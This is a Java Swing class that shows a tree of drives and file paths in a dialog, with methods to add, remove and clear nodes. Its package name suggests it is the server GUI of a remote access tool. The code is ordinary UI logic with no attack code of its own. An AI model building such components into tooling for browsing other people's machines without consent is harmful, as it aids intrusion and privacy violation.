package de.sogomn.rat.server.gui;

import java.awt.Dimension;

import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JTree;
import javax.swing.tree.DefaultMutableTreeNode;

public final class FileTreePanel {
	
	private JDialog dialog;
	
	private DefaultMutableTreeNode root;
	private JTree tree;
	
	private static final String ROOT_NAME = "Drives";
	private static final int DEFAULT_WIDTH = 500;
	private static final int DEFAULT_HEIGHT = 500;
	
	public FileTreePanel() {
		dialog = new JDialog();
		root = new DefaultMutableTreeNode(ROOT_NAME);
		tree = new JTree(root);
		
		tree.setEditable(false);
		tree.setBorder(null);
		
		dialog.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		dialog.setPreferredSize(new Dimension(DEFAULT_WIDTH, DEFAULT_HEIGHT));
		dialog.setContentPane(tree);
		dialog.pack();
		dialog.setLocationByPlatform(true);
	}
	
	private DefaultMutableTreeNode[] getChildren(final DefaultMutableTreeNode node) {
		final int childCount = node.getChildCount();
		final DefaultMutableTreeNode[] children = new DefaultMutableTreeNode[childCount];
		
		for (int i = 0; i < childCount; i++) {
			final DefaultMutableTreeNode child = (DefaultMutableTreeNode)node.getChildAt(i);
			
			children[i] = child;
		}
		
		return children;
	}
	
	private DefaultMutableTreeNode getChild(final DefaultMutableTreeNode node, final String name) {
		final DefaultMutableTreeNode[] children = getChildren(node);
		
		for (final DefaultMutableTreeNode child : children) {
			final Object object = child.getUserObject();
			
			if (object.equals(name)) {
				return child;
			}
		}
		
		return null;
	}
	
	private DefaultMutableTreeNode getByName(final DefaultMutableTreeNode start, final String[] path) {
		if (path.length == 0) {
			return null;
		}
		
		final String name = path[0];
		final DefaultMutableTreeNode node = getChild(start, name);
		
		if (path.length == 1 || node == null) {
			return node;
		}
		
		final String[] remainingPath = new String[path.length - 1];
		System.arraycopy(path, 1, remainingPath, 0, remainingPath.length);
		
		return getByName(node, remainingPath);
	}
	
	private void addAll(final DefaultMutableTreeNode start, final String[] path) {
		if (path.length == 0) {
			return;
		}
		
		final String name = path[0];
		
		DefaultMutableTreeNode node = getChild(start, name);
		
		if (node == null) {
			node = new DefaultMutableTreeNode(name);
			
			start.add(node);
		}
		
		final String[] remainingPath = new String[path.length - 1];
		System.arraycopy(path, 1, remainingPath, 0, remainingPath.length);
		
		addAll(node, remainingPath);
	}
	
	public void addFile(final String... path) {
		addAll(root, path);
	}
	
	public void removeFile(final String... path) {
		final DefaultMutableTreeNode node = getByName(root, path);
		
		if (node != null) {
			node.removeFromParent();
		}
	}
	
	public void clear() {
		root.removeAllChildren();
	}
	
	public void setVisible(final boolean state) {
		dialog.setVisible(state);
	}
	
}
